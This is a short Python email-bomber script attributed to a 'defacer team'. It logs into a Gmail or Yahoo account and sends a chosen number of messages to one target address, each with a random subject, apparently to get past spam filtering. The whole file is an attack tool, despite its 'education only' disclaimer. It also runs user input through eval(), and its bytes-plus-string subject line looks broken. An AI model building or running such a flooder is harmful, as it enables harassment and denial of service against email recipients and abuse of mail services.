#!/usr/bin/python
#Bomb-Email
#This code for education purpose only.
#Use it at your own risk !!!


import os
import smtplib
import getpass
import sys

print('+=========================+')
print('|| PONOROGO DEFACER TEAM ||')
print('||     root-ID-041       ||')
print('||   Date 20/09/2017     ||')
print('+=========================+')

server = input ('MailServer Gmail/Yahoo: ')
user = input('Emailmu: ')
passwd = getpass.getpass('Passwordmu: ')


to = input('\nTo: ')
#subject = raw_input('Subject: ') 
body = input('Message: ')
total = eval(input('Number of send: '))

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print('Applies only to gmail and yahoo.')
    sys.exit()

print('')

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print("\rE-mails sent: %i" % i)
        sys.stdout.flush()
    server.quit()
    print('\n Done !!!')
except KeyboardInterrupt:
    print('[-] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print('\n[!] The username or password you entered is incorrect.')
    sys.exit()

